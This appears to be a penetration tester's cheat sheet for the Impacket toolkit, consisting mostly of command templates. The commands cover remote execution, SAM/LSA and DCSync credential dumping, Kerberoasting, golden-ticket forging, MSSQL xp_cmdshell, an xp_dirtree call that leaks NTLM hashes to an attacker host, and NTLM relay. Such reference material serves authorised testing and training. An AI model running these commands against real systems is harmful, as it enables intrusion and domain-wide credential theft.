---
tags: [basics, tool, framework, smb, mssql, kerberos]
---


> [!info] See also: [[SMB]] · [[MSSQL]] · [[Active Directory]] · [[NetExec]] · [[Windows Password Hunting]]


[Impacket](https://github.com/fortra/impacket) is a Python collection of MS protocol implementations. Most pentest distros ship the scripts under `/usr/share/doc/python3-impacket/examples/` or as `impacket-*` wrappers in `$PATH`.

This file collects the most-used examples; each has its own quirks but the auth flags are consistent.

## Common Auth Syntax 

Most scripts accept the same target/credential format:

```bash
# user / password
script.py <DOMAIN>/<user>:<password>@<target>

# pass-the-hash (LM:NT)
script.py -hashes :<NTLM-hash> <DOMAIN>/<user>@<target>

# Kerberos ticket (KRB5CCNAME points to ccache)
export KRB5CCNAME=/tmp/user.ccache
script.py -k -no-pass <DOMAIN>/<user>@<target.fqdn>

# Local auth (workgroup, not domain)
script.py <user>:<password>@<target>
```

## Code Execution

### psexec.py

Creates a service on the target → SYSTEM shell. Loud (writes a binary, creates a service).

```bash
psexec.py <DOMAIN>/<user>:<password>@<target>
psexec.py -hashes :<NTLM-hash> <DOMAIN>/<user>@<target>
```

### smbexec.py

Same idea but semi-interactive (no full TTY); no binary uploaded, uses service command line.

```bash
smbexec.py <DOMAIN>/<user>:<password>@<target>
```

### wmiexec.py

Executes commands via WMI; no service created → quieter than psexec.

```bash
wmiexec.py <DOMAIN>/<user>:<password>@<target>
wmiexec.py <user>:"<pwd>"@<ip> "<system command>"
```

### atexec.py

Schedules a one-shot task; useful when WMI/SMB exec is blocked but Task Scheduler isn't.

```bash
atexec.py <DOMAIN>/<user>:<password>@<target> "whoami /all"
```

## Credential Dumping

### secretsdump.py

Pull SAM, LSA secrets, cached credentials, and (against a DC) the NTDS.dit.

```bash
# Local SAM/LSA over SMB
secretsdump.py <DOMAIN>/<user>:<password>@<target>

# DCSync — dump all domain hashes (needs DA-equivalent or DS-Replication rights)
secretsdump.py -just-dc <DOMAIN>/<user>:<password>@<dc>
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<user>:<password>@<dc>

# From local hive files
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## Kerberos

### GetUserSPNs.py — Kerberoasting

```bash
GetUserSPNs.py <DOMAIN>/<user>:<password> -dc-ip <dc-ip> -request
```

### GetNPUsers.py — AS-REP Roasting

```bash
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
```

### ticketer.py — Forge tickets (Golden / Silver)

```bash
ticketer.py -nthash <krbtgt-hash> -domain-sid <SID> -domain <DOMAIN> Administrator
```

## Database

### mssqlclient.py

```bash
# Interactive MSSQL shell
mssqlclient.py <user>:<password>@<target>

# Windows authentication
mssqlclient.py -windows-auth <DOMAIN>/<user>:<password>@<target>

# Run a query straight away
mssqlclient.py <user>:<password>@<target> -q "SELECT name FROM sys.databases"
```

Once connected:
```
help                              # full command list
enable_xp_cmdshell
xp_cmdshell whoami
xp_dirtree \\<attacker-ip>\share  # forces NTLMv2 leak to attacker host
```

## File Transfer / Servers

### smbserver.py

Spin up an SMB share you can hit from the target — great for staging tools or grabbing files.

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
# With auth:
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Capture NTLM hashes by forcing a victim to connect:
```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support  # then trigger UNC path access
```

### ntlmrelayx.py — NTLM relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldap://<dc> --escalate-user <controlled-user>
```

## DNS / AD

```bash
# DC enumeration without creds
lookupsid.py <DOMAIN>/<user>:<password>@<target> 

# Add/remove DNS records via LDAP
dnstool.py -u '<DOMAIN>\<user>' -p <password> -a add -r <name> -d <ip> <dc>
```

## Tickets in CCache form (cross-platform)

```bash
# Convert .kirbi → .ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Use it
export KRB5CCNAME=$(pwd)/ticket.ccache
```
